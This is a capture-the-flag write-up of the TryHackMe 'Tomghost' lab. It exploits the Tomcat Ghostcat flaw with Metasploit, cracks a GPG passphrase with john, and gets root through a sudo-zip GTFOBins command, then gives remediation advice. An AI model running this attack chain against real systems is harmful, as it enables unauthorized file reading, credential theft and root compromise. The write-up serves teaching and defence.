# TryHackMe — Tomghost (CVE-2020-1938 "Ghostcat")

> **Disclaimer** — Educational writeup of a controlled lab environment (TryHackMe). Flags have been replaced with `<FLAG_USER>` / `<FLAG_ROOT>` and credentials with placeholders. **Do not use these techniques against systems without explicit authorization.**

---

## Overview

**Tomghost** exploits **CVE-2020-1938**, known as **Ghostcat**, in Apache Tomcat's AJP connector. The flaw allows an unauthenticated attacker to read any file within the web application's context (including sensitive configuration files), which in this case exposes credentials embedded in a comment inside `web.xml`.

From there, the attack chain continues through SSH access, decrypting a GPG key protected by a weak password, and ends with a privilege escalation to root through a misconfigured `zip` binary in `sudoers` (a technique catalogued on GTFOBins).

| Stage | Vector |
|---|---|
| Initial access | CVE-2020-1938 (Ghostcat) — file read via AJP |
| Credentials found | Comment inside `web.xml`, read via Ghostcat |
| Lateral access | SSH with the discovered credentials |
| Escalation to another user | Decrypted GPG key + `credential.pgp` |
| Root privilege | `sudo zip` with a test option (`-T`) abused via GTFOBins |

---

## Reconnaissance

```bash
nmap -Pn -sV -p- <TARGET_IP>
```

**Result:**

```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Port Analysis

### Port 22 — SSH

Standard remote-access service. Kept in mind for a later stage, once valid credentials are obtained.

### Port 53 — `tcpwrapped`

The port is open and accepts the initial TCP handshake, but the service closes the connection immediately afterward, without returning any banner — which is why Nmap classifies it as `tcpwrapped`. This is normally caused by one of the following:

- **TCP Wrappers** (`/etc/hosts.allow` / `/etc/hosts.deny`) filtering the source IP.
- A **firewall/IPS/IDS** detecting the scan behavior and cutting the connection.
- The DNS service itself being configured to only accept requests from specific IPs.

It was not investigated further, as it was not relevant to this machine's attack chain.

### Port 8009 — AJP (Apache JServ Protocol) 1.3

```bash
nmap -Pn -sC -p 8009 <TARGET_IP>
```

**Result:**

```text
8009/tcp open  ajp13
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
```

AJP is a binary protocol used for communication between a front-end web server (Apache HTTP Server, Nginx) and a Tomcat back-end. This exposed port, combined with the Tomcat version, is the most important clue toward the vulnerability.

### Port 8080 — HTTP (Apache Tomcat)

```bash
curl -I http://<TARGET_IP>:8080
```

**Result:**

```text
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
```

---

## Identifying the Vulnerability (Ghostcat)

The combination of **Apache Tomcat 9.0.30** + **exposed AJP connector on port 8009** matches exactly the profile of **CVE-2020-1938 ("Ghostcat")**. This vulnerability allows an unauthenticated attacker, through the AJP protocol, to read any file inside the application's `webapps` directory — including configuration files normally inaccessible via HTTP, such as `web.xml`. Under certain conditions (when the application allows file uploads), it can even escalate to remote code execution.

### Locating the exploit

```bash
searchsploit ajp
```

**Relevant result:**

```text
Exploit Title                                                    |  Path
------------------------------------------------------------------------------------
AjPortal2Php - 'PagePrefix' Remote File Inclusion                 | php/webapps/3752.txt
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion                 | multiple/webapps/48143.py
Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)   | multiple/webapps/49039.rb
```

There is both a standalone Python script and a ready-made Metasploit module — I chose Metasploit for simplicity.

---

## Exploitation with Metasploit

```bash
msfconsole
search tomcat ghostcat
```

**Result:**

```text
Matching Modules
================
   #  Full Name                             Disclosure Date  Rank    Check  Name
   -  ---------                             ---------------  ----    -----  ----
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read
```

Select and configure the module:

```text
use 0
show options
```

```text
Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS                      yes       The target host(s)
   RPORT     8009              yes       The Apache JServ Protocol (AJP) port (TCP)
```

`FILENAME` already defaults to `web.xml` — exactly the configuration file that often contains sensitive information left in development comments.

```text
set RHOSTS <TARGET_IP>
set RPORT 8009
run
```

The module reads the file remotely and saves a local copy to a timestamped `.txt` file.

---

## Finding Credentials in `web.xml`

```bash
cat 20261111181316_default_<TARGET_IP>_WEBINFweb.xml_008765.txt
```

**Relevant excerpt:**

```xml
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  ...>
  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
     <USERNAME>:<PASSWORD>
  </description>
```

> **Critical finding:** a development comment left inside `web.xml` contains, in plain text, a username:password pair. This is a classic example of a "secret forgotten in a configuration file" — the same mistake pattern seen in other CTFs (keys in `app.js`, credentials in `.env`, etc.).

---

## SSH Access and GPG Files

With the discovered credentials:

```bash
ssh <USERNAME>@<TARGET_IP>
```

Once inside, enumerating the home directory revealed two interesting files:

```bash
ls
# credential.pgp  tryhackme.asc
```

| File | Nature |
|---|---|
| `tryhackme.asc` | **GPG private key** belonging to another user (`merlin`), protected by a passphrase |
| `credential.pgp` | File **encrypted** with `merlin`'s public key — decrypting it with the matching private key reveals that user's credentials |

Transfer both files to the attacking machine for offline analysis:

```bash
scp <USERNAME>@<TARGET_IP>:~/tryhackme.asc ~/tomghost/
scp <USERNAME>@<TARGET_IP>:~/credential.pgp ~/tomghost/
```

---

## Cracking the GPG Key Passphrase

The private key (`tryhackme.asc`) is protected by a passphrase — without it, it can't be used to decrypt `credential.pgp`. The `gpg2john` tool (part of the John the Ripper Jumbo suite) converts the key into a hash format compatible with dictionary attacks.

```bash
gpg2john tryhackme.asc > pgp.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pgp.hash
```

**Result:** the passphrase was successfully cracked using `rockyou.txt`, revealing the secret that protects `merlin`'s private key.

---

## Decrypting the Credentials

### 1. Import the private key into the local keyring

```bash
gpg --import tryhackme.asc
```

**Result:**

```text
gpg: key <KEY_ID>: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key <KEY_ID>: secret key imported
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

### 2. Decrypt `credential.pgp`

```bash
gpg --decrypt credential.pgp
```

When prompted, enter the passphrase cracked in the previous step.

**Result:**

```text
gpg: encrypted with elg1024 key, ID <KEY_ID>, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"

merlin:<PASSWORD_MERLIN>
```

The `merlin` user's credentials are now revealed in plain text.

---

## User Flag

With `merlin`'s credentials, login was performed (via `su merlin` within the existing SSH session, or directly via SSH):

```bash
cat user.txt
```

**Result:** `<FLAG_USER>`

---

## Privilege Escalation — GTFOBins `zip`

### Enumeration

```bash
id
```

```text
uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

```bash
sudo -l
```

```text
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

The `merlin` user can run `/usr/bin/zip` as root, **with no password** — and no restriction on arguments. This is exploitable, as catalogued on [GTFOBins](https://gtfobins.github.io/gtfobins/zip/).

### Exploitation

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

**Step-by-step explanation:**

1. **`TF=$(mktemp -u)`** — generates a random temporary filename (e.g., `/tmp/tmp.aB3xY9`), without actually creating it (`-u` = "unsafe", name only). It's just the destination for the zip we're about to create.

2. **`sudo zip $TF /etc/hosts`** — the core of the attack. Since `merlin` has passwordless `sudo` permission over `/usr/bin/zip`, this command runs **as root**, creating a `.zip` archive at `$TF` containing `/etc/hosts`. Nothing unusual so far.

3. **`-T` and `-TT`** — `zip` options to **test the integrity** of the archive after creation (`-T` tests it; `-TT` tests it in a more verbose mode). The crucial detail: to perform this test, `zip` invokes an external shell command (by default, something like `unzip -t`) — and that invocation **can be overridden** by the user.

4. **`'sh #'`** — is the custom test command that replaces the default one. `zip` literally executes `sh #` **as root** to "test" the archive. The `#` is just a shell comment, used here to nullify any extra argument `zip` might try to append after our command — ensuring `sh` is invoked cleanly, with no syntax errors.

The end result is an interactive `sh` shell running with root privileges.

---

## Root Flag

Inside the root shell obtained:

```bash
cd /root
ls
# root.txt  ufw

cat root.txt
```

**Result:** `<FLAG_ROOT>`

---

## Lessons Learned

- **Outdated software versions with known CVEs** (here, Tomcat 9.0.30 vulnerable to Ghostcat) remain one of the most common and most easily automated initial access vectors.
- **Secrets left in configuration file comments** (`web.xml`, and elsewhere `.env`, `app.js`, etc.) continue to be one of the most frequent forms of credential leakage.
- **GPG keys protected by weak passphrases** are just as crackable as any other password — `gpg2john` + a dictionary quickly solves it when the passphrase is in a common wordlist.
- **`sudoers` rules with no argument restrictions** on "harmless" binaries like `zip`, `tar`, `find`, `vim`, etc., are extremely dangerous — GTFOBins documents dozens of binaries abusable this way.

---

## Remediation

| Issue | Fix |
|---|---|
| CVE-2020-1938 (Ghostcat) | Upgrade Tomcat to a patched version (≥ 9.0.31, 8.5.51, 7.0.100); disable the AJP connector if not needed, or bind it with `requiredSecret` |
| Credentials in `web.xml` | Never leave secrets in configuration file comments; use environment variables or a secrets vault |
| Weak GPG passphrase | Use long, unique passphrases outside of known wordlists |
| `sudo zip` with no restrictions | Never grant `NOPASSWD` over generic archive/compression binaries without explicitly restricting arguments; consult [GTFOBins](https://gtfobins.github.io/) before configuring `sudoers` rules |

---

## Tools Used

- `nmap` — port and service reconnaissance
- `searchsploit` — locating public exploits
- Metasploit (`auxiliary/admin/http/tomcat_ghostcat`) — exploiting Ghostcat
- `ssh` / `scp` — remote access and file transfer
- `gpg2john` + `john` (wordlist `rockyou.txt`) — cracking the GPG passphrase
- `gpg` — key import and decryption
- GTFOBins (`zip`) — privilege escalation

---